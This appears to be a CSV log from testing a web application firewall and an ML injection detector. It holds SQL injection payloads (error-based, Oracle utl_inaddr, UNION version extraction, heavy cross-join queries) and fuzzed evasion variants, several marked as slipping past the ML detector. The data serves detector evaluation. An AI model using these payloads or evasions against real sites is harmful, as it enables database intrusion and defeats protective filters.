Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T16:47:29.410580,"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",403,403,403,both_correct,"1'  )   ANd   (  SeLecT 'v T'!='v TK'*  (  iF   (    (   select * froM   (  SEleCT concat  (  0x7171706a71,  ( /**/sElECt   (  elt  (
 3484   like    AND 1,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 0x7538dcfb7617fffa   )    )     )  ",2024-12-16T16:47:41.019396,403,403,both_correct,"1658 NOT LIKE 1659'  )   ANd
  (  SeLecT 'v T'!='v TK'*  (  If   (    (   SElECT * fROM   (  sElEcT concat  (  0x7171706a71,  ( /**/SelEcT   (  elt  (
 3484 /**/ lIKe    && 1, OR 0x0   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 0x7538dcfb7617fffa   )    )     )  ",2024-12-16T16:47:54.672924,403,200,waf_correct_ml_incorrect,"1658 not like 1659'  )   ANd
  (  SeLecT 'v T'!='v TK'*  (  If   (    (   SElECT * frOM   (  SElect concat  (  0x7171706a71,  ( /**/selEct   (  elt  (  3484   liKe    && (SELECT 1460 IN (1459,1460,1461)), oR 0x0   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, 0x7538dcfb7617fffa   )    )     )  ",2024-12-16T16:48:09.416488,403,200,waf_correct_ml_incorrect,"1658 not like 0x67b'  )   ANd   (  SeLecT 'v T'!='v TK'*  (  If   (    (   SElECT * frOM   (  SElect concat  (  0x7171706a71,  ( /*-Mv*/selEct   (  elt  (  3484/**/  liKe     AND  (SELECT 'G'<>'Gc' in (1459,1460,(SeLeCt 1))), OR 0x0   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, 0x7538dcfb7617fffa   )    )     )  ",2024-12-16T16:48:25.548589,403,200,waf_correct_ml_incorrect,"9624 not like 9625 not like 0x67b'  )   ANd   (  SeLecT 'v T'!='v TK'*  (  If   (    (   SElECT * frOM   (  SElect concat  (  0x7171706a71,  ( /**/selEct   (  elt  (  (SELECT 3484)   liKe     AND  (SELECT 'G'<>'Gc' IN
(1459,(SeLeCT 1),(sELEct 1))), oR 0x0   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 0x7538dcfb7617fffa, 0x7538dcfb7617fffa   )    )     )  ",2024-12-16T16:48:42.672019,403,200,waf_correct_ml_incorrect
12,2024-12-16T16:49:00.665235,28194,200,200,200,both_correct,(SeLEcT/*O[*/'R' not like 'R)'),2024-12-16T16:49:01.042676,403,403,both_incorrect,"(SElEcT/**/'R'/*cdl*/not like
'R)')",2024-12-16T16:49:03.570610,403,200,waf_incorrect_ml_correct,"(sELECt	'R'/**/not like
'R)')",2024-12-16T16:49:06.552489,403,200,waf_incorrect_ml_correct,"(SeleCT 'R' not like
'R)')",2024-12-16T16:49:09.036013,403,200,waf_incorrect_ml_correct,"(SeLEct
'R'/*_AS */not like
'R)')",2024-12-16T16:49:11.417285,403,200,waf_incorrect_ml_correct
13,2024-12-16T16:49:14.074012,fl5ct499t1,200,200,200,both_correct,fl5ct499t1,2024-12-16T16:49:14.684275,200,200,both_correct,fl5ct499t1,2024-12-16T16:49:16.274334,200,200,both_correct,fl5ct499t1,2024-12-16T16:49:17.866025,200,200,both_correct,fl5ct499t1,2024-12-16T16:49:19.460017,200,200,both_correct,fl5ct499t1,2024-12-16T16:49:21.041540,200,200,both_correct
14,2024-12-16T16:49:22.619227,ilya,200,200,200,both_correct,ilya,2024-12-16T16:49:22.948917,200,200,both_correct,ilya,2024-12-16T16:49:24.241749,200,200,both_correct,ilya,2024-12-16T16:49:25.559646,200,200,both_correct,ilya,2024-12-16T16:49:26.888960,200,200,both_correct,ilya,2024-12-16T16:49:28.213925,200,200,both_correct
15,2024-12-16T16:49:29.539282,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,403,403,200,waf_correct_ml_incorrect,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (/**/ 112  )  ||chr  ( 	106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  (SELECT 4386)  )   then 1 else '6Z' NOT LIKE '6Zh' end  )   from dual  )  ||chr  (  113  )  ||chr  (   OR 0  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,2024-12-16T16:49:46.297798,403,200,waf_correct_ml_incorrect,"1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (/*}r*/ 112  )  ||chr  ( 
106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  (SELECT 4386)  )   then 1 else '6Z' NOT LIKE '6Zh' end  )   from dual  )  ||chr  (  (SELECT 113)  )  ||chr  (   OR 0  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (   AND 1!=432   )    )    and  /**/(  'vnfi'  =  'vnfi",2024-12-16T16:50:05.403119,403,200,waf_correct_ml_incorrect,"(SELEct 1)'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (/*b*/ '*'<>'*r'  )  ||chr  ( 
106  )  ||chr /**/(  113  )  ||  (  select   (  case when   (  4386  =  (SELECT	0x1122)  )   then 1 else '6Z' NOT LIKE '6Zh' end  )   from dual  )  ||chr  (  (SELECT 113)  )  ||chr  (   OR 0  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (   AND 1!=432   )    )    and  /**/(  'vnfi'  =  'vnfi",2024-12-16T16:50:25.587056,403,403,both_correct,(sELecT 1)'  )   and  OR 0x0  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (/*b*/ '*'<>'*r'  )  ||chr  (  1257 NOT LIKE 1258  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  (SELECT	0x1122)  )   then 1 else '6Z' NOT LIKE '6Zh' end  )   from dual  )  ||chr  (  (SELECT 113)  )  ||chr  (   OR 0  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (   AND 1!=432   )    )    and  /**/(  'vnfi'  =  'vnfi,2024-12-16T16:50:46.892280,403,200,waf_correct_ml_incorrect,"(SelecT 1)'  )   and  OR 0x0  =  utl_inaddr.get_host_address  (  chr  (   OR 0  )  ||chr  (  113  )  ||chr  (/**/ '*'<>'*r'  )  ||chr  (  'wr' LIKE 'wr' NOT LIKE 1258  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  (SELECT	0x1122)  )   then 1 else '6Z' NOT LIKE '6Zh' end  )   from dual  )  ||chr  (  (SELECT 113)  )  ||chr  (   OR (SELECT 0)
 )  ||chr  (  118  )  ||chr  (/**/ 122  )  ||chr  (   AND 1!=432   )    )    and  /*>*_*/(  'vnfi'  =  'vnfi",2024-12-16T16:51:08.565172,403,403,both_correct
16,2024-12-16T16:51:31.688231," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",403,403,403,both_correct," SeLECt * frOM users WhEre id 
 LIKe /**/ '9452 NOT LIKE 9453' <@$_ union SeLeCt (SELEct 1),version  (    )   --  AND 1'#",2024-12-16T16:51:35.624061,403,403,both_correct," SELeCt * FrOm users wHeRe id 
 LIKe   '9452 NOT LIKE 9453' <@$_ union SELECT (sEleCT (seLeCt 1)),version  (    )   -- 
&& 1212 NOT LIKE (SELECT 1213)'#YQ",2024-12-16T16:51:42.536374,403,403,both_correct," seLECT * FrOm users wHeRE id 
 likE   '(SELECT
1)/**/NOT LIKE '4OR'!='4OR|'' <@$_ union sElecT (seLect (sELEcT 1)),version  (    )   -- 
 AND  0x4bc NOT LIKE (sELeCt 1213)'#YQs0",2024-12-16T16:51:50.967451,403,403,both_correct," sElecT * FRoM users WheRe id 
 lIkE   '(SELECT 1)/**/NOT LIKE/**/'4OR'!='4OR|'' <@$_ union SELecT (SelEcT (SElECt (SELECT 1))),version  (    )   -- 
 AnD  0x4bc NOT LIKE (SelEcT  AND 1 like 899)'#YQs08t",2024-12-16T16:52:00.280028,403,403,both_correct," sELEcT * FrOM users wHERe id 
 lIKE   '(SELECT 1) NOT LIKE/*a*/'4OR'!='4OR|'' <@$_ union SElECT (sElEcT (select (SelEct 0x1))),version  (    )  
-- 
 And  0x4bc not like (sELeCt  anD 1 LikE  OR 4921 LIKE 4921)'#YQs08t",2024-12-16T16:52:11.234329,403,403,both_correct
17,2024-12-16T16:52:22.650764,"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",403,403,403,both_correct,"0x1""  )   As zhlf wheRe 4119   LIKe/**/	 (SELeCt 1) OR 9262<>9263  =    (  SeLecT count  (  *  )   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",2024-12-16T16:52:30.037376,403,403,both_correct,"0x1""  )   as zhlf WhERE 0x1017   LIke 	 (selecT 1) OR 9262<> AnD ','=','  =	   (  SELECt count  (  *  )   froM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",2024-12-16T16:52:40.152059,403,403,both_correct,"0x1""  )   AS zhlf WheRE 0x1017   LIkE 	 (SelECt 1312=1312) or  And 0x1<> ANd ','=','   likE 
   (  sElecT count  (  */**/ )   frOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",2024-12-16T16:52:50.178106,403,403,both_correct,"0x1""  )   AS zhlf wheRE 0x1017   Like/**/  (selecT  oR 0x0='f'<>'fl') or  AND 0x1 NOT LIKE  aNd ','=','   liKE 
   (  seLeCT count  (  */*H*/ )   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",2024-12-16T16:53:01.693978,403,403,both_correct,"0x1""
 )   as zhlf WHerE 0x1017   lIke/**/  (SelEcT  or 0x0='f'<>'fl') or  aNd 0x1 NOT LIKE  aND ','=','/**/  LiKe 
   (  sElECt count  (  */**/ )   fRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",2024-12-16T16:53:13.577780,403,200,waf_correct_ml_incorrect
18,2024-12-16T16:53:25.158320,marcelo,200,200,200,both_correct,marcelo,2024-12-16T16:53:25.644703,200,200,both_correct,marcelo,2024-12-16T16:53:27.303599,200,200,both_correct,marcelo,2024-12-16T16:53:28.817604,200,200,both_correct,marcelo,2024-12-16T16:53:30.307571,200,200,both_correct,marcelo,2024-12-16T16:53:31.807559,200,200,both_correct
19,2024-12-16T16:53:33.281370,1212,200,200,200,both_correct,0x4bc,2024-12-16T16:53:33.608659,200,200,both_correct,0x4bc,2024-12-16T16:53:34.969159,200,200,both_correct,0x4bc,2024-12-16T16:53:36.344758,200,200,both_correct,0x4bc,2024-12-16T16:53:37.702049,200,200,both_correct,0x4bc,2024-12-16T16:53:39.061338,200,200,both_correct
20,2024-12-16T16:53:40.422737,14724400f,200,200,200,both_correct,14724400f,2024-12-16T16:53:40.951719,200,200,both_correct,14724400f,2024-12-16T16:53:42.514960,200,200,both_correct,14724400f,2024-12-16T16:53:44.089662,200,200,both_correct,14724400f,2024-12-16T16:53:45.618099,200,200,both_correct,14724400f,2024-12-16T16:53:47.201490,200,200,both_correct
